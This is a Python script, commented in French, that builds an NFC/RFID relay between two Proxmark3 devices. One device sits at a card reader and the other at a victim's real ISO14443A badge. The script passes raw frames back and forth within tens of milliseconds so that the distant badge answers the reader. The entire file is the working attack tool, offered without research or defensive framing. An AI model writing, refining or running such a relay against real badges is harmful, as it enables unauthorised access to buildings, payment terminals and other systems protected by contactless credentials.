#!/usr/bin/env python3
import serial
import struct
import time


# --- Paramètres Ports ---
PROXY_PORT = '/dev/ttyACM0' # Côté Lecteur/Téléphone
MOLE_PORT  = '/dev/ttyACM1' # Côté Badge réel


# --- Constantes Iceman ---
CMD_HF_ISO14443A_READER = 0x0385
MAGIC = 0x61334d50
RESP_MAGIC = 0x62334d50


# Flags RAW : bit 1 (No Disc) + bit 3 (Raw) + bit 6 (Active Snoop)
# On ajoute bit 4 (Append CRC) pour laisser le hardware calculer les checksums
FLAGS = (1 << 1) | (1 << 3) | (1 << 6) | (1 << 4)


class RawRelay:
    def __init__(self):
        try:
            self.proxy = serial.Serial(PROXY_PORT, 460800, timeout=0.1)
            self.mole  = serial.Serial(MOLE_PORT, 460800, timeout=0.1)
            print(f"[*] Connecté : Proxy({PROXY_PORT}) & Mole({MOLE_PORT})")
        except Exception as e:
            print(f"[-] Erreur connexion : {e}")
            exit()


    def _build_pkt(self, data, flags):
        # Format MIX : 24 octets d'args (3x uint64) + data
        payload = struct.pack('<QQQ', flags, len(data), 0) + data
        head = struct.pack('<IHH', MAGIC, len(payload) & 0x7FFF, CMD_HF_ISO14443A_READER)
        return head + payload + b'\x33\x61'


    def _read_frame(self, ser):
        if ser.in_waiting:
            print(f"[DEBUG] Bytes waiting: {ser.in_waiting}")
        if ser.in_waiting < 10:
            return None
       
        head = ser.read(10)
        if len(head) < 10:
            return None
       
        magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', head)


        #print(f"[DEBUG] head={head.hex()} magic={hex(magic)}") #pour savoir si ce qui est renvoyé est du magic ou Resp_magic
        if magic not in (MAGIC, RESP_MAGIC):
            return None


         #lire le payload complet
        length = length_ng & 0x7FFF
        payload = b''
        while len(payload) < length:
            chunk = ser.read(length - len(payload))
            if not chunk:
                break
            payload += chunk
        ser.read(2) # Postamble


       
        if len(payload) < 24:
            return payload  # retourner tout si moins de 24 octets
        else:
            return payload[24:]  # sinon couper les 24 octets de l'entête


    def run(self):
        print("\n" + "="*50)
        print("   RELAY RAW TOTAL (SANS SIMULATE)")
        print("   Latence estimée : 4ms - 10ms")
        print("="*50 + "\n")


        # Activation du champ sur les deux appareils
        self.proxy.write(self._build_pkt(b'', FLAGS))
        self.mole.write(self._build_pkt(b'', FLAGS))


        try:
            while True:
                # 1. Écoute du lecteur via le Proxy
                reader_bits = self._read_frame(self.proxy)
               
                if reader_bits:
                    print(f"[LECTEUR] >> {reader_bits.hex()}")
                   
                    # 2. Envoi immédiat au badge via la Mole
                    self.mole.write(self._build_pkt(reader_bits, FLAGS))
                   
                    # 3. Attente réponse du badge (Poll rapide)
                    start_wait = time.time()
                    tag_bits = None
                    while (time.time() - start_wait) < 0.05: # Timeout 50ms
                        tag_bits = self._read_frame(self.mole)
                        if tag_bits: break
                   
                    if tag_bits:
                        print(f"   [TAG] << {tag_bits.hex()}")
                        # 4. Renvoi de la réponse au lecteur
                        self.proxy.write(self._build_pkt(tag_bits, FLAGS))
                    else:
                        print("   [TAG] << (Silence)")


        except KeyboardInterrupt:
            print("\n[*] Arrêt du pont.")
            self.proxy.close()
            self.mole.close()


if __name__ == "__main__":
    RawRelay().run()

